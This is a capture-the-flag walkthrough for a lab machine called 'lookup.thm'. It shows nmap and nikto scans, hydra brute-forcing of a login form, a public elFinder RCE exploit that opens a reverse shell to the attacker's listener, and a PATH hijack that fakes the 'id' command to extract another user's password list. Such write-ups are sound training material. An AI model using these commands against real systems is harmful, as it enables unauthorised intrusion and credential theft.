# Enumeration
This CTF seems to use domains so I already went ahead and added the domain `lookup.thm` to my `/etc/hosts` file
## Nmap
Time to see what ports are Open on the machine...
```bash
$ cat nmap-initial 
# Nmap 7.94SVN scan initiated Tue Apr 22 16:08:15 2025 as: nmap -oN nmap-initial lookup.thm
Nmap scan report for lookup.thm (10.10.198.178)
Host is up (0.040s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

seems to be a basic setup with http and ssh running. Let's do some further scanning before we check the http server out.

```bash
$ nmap -A lookup.thm -oN nmap-Agressive
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-22 17:43 CEST
Nmap scan report for lookup.thm (10.10.208.157)
Host is up (0.038s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Login Page

..Snip..(OS Scan failed)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT      ADDRESS
1   37.74 ms 10.21.0.1
2   38.01 ms lookup.thm (10.10.208.157)
```

The Aggressive scan revealed that Apache is outdated and in The Traceroute we can see another server lets check this one out two

```bash
$ nmap 10.21.0.1
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-23 14:44 CEST
Nmap scan report for 10.21.0.1
Host is up (0.039s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
```

This was a shot in the dark lets have a look at the HTTP server
## Apache HTTP server
upon Opening the Website we get a login screen when we try to login we make a post request to `/login.php` 
![[Pasted image 20250423145014.png]]
### Fuzzing
Decided to do some Fuzzing but had no luck did a Directory scan which returned the login.php site and a Subdomain(Vhost) scan which revealed nothing
### Nikto
at this point I was kind of clueless so I just ran nikto on it to see what happens
```bash
$ nikto -host lookup.thm
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.208.157
+ Target Hostname:    lookup.thm
+ Target Port:        80
+ Start Time:         2025-04-22 18:18:07 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /login.php: Admin login page/section found.
+ 7962 requests: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2025-04-22 18:23:51 (GMT2) (344 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

seems to me that this is just a generic website with a login page My only option is to bruteforce the login window so lets go ahead and do that...

# Vulnerability Assessment
I did some testing with the login page trying to see how it works doing that I found out that the admin user exists on the system and we only need to find out his password

When we try with a trash user we get `Wrong username or password` as the output
![[Pasted image 20250423145755.png]]

When using the admin user we only get `Wrong password` which indicates that the password request are being handled insecurely 
![[Pasted image 20250423145852.png]]

# Exploitation
## Hydra
```bash
$ hydra -l admin -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt http-post-form://lookup.thm"/login.php:username=^USER^&password=^PASS^:F=Wrong password. Please try again."
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-23 15:06:44
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1000000 login tries (l:1/p:1000000), ~62500 tries per task
[DATA] attacking http-post-form://lookup.thm:80/login.php:username=^USER^&password=^PASS^:F=Wrong password. Please try again.
[80][http-post-form] host: lookup.thm   login: admin   password: password123
```

when we try to use the password and username we get a new error
![[Pasted image 20250423151547.png]]

that's kinda weird, maybe we need to find another username.
```bash
$ hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -p password123 http-post-form://lookup.thm"/login.php:username=^USER^&password=^PASS^:F=Wrong username or password. Please try again."

..Snip..

[80][http-post-form] host: lookup.thm   login: jose   password: password123
```

Now we can finally login!
## elFinder
Upon Logging in We get greeted with a bunch of files that contain what I think is password's But I didn't care too much about that as the version seems to be outdated and there is a public exploit available at [GitHub](https://github.com/hadrian3689/elFinder_2.1.47_php_connector_rce/tree/main) 
![[Pasted image 20250424182331.png]]

After Downloading the Exploit all I had to do is run it
```bash
python3 exploit.py -t http://files.lookup.thm/elFinder/ -lh 10.21.21.101 -lp 1337
```

We get a shell as `www-data`
```bash
$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.21.21.101] from (UNKNOWN) [10.10.164.72] 55534
bash: cannot set terminal process group (708): Inappropriate ioctl for device
bash: no job control in this shell
www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$ 
```

*After that I took a peek at someone else's writeup because im not too good with privesc yet*

I found the File `/usr/sbin/pwm` which is owned by root when we run it we get
```bash
$ /usr/sbin/pwm                
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found
```

the code is encoded so we wont be able to easily change it so we either have to do some reverse engineering or we just try to manipulate the ID command so that the script thinks we are the "think" user
```bash
# The /usr/sbin/pwm command checks in each directory of $PATH to see if there is an id command present 
# If we edit the $PATH variable to have /tmp(or any other directory we have access to) at the beginning then the /usr/sbin/pwm command will first check the /tmp directory for an id file present in there and try to execute it so when we edit the file to return the think user instead of www-data the script will think that we are think 
$ cd /tmp
$ echo $PATH                
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
$ export PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
$ echo "echo 'uid=33(think) gid=33(think) groups=33(think)'" > id
$ chmod +x ./id
$ id
uid=33(think) gid=33(think) groups=33(think)
$ /usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: think
jose1006
jose1004
jose1002
..Snip..
```

funny enough that the output we get looks like a wordlist lets try to use it as one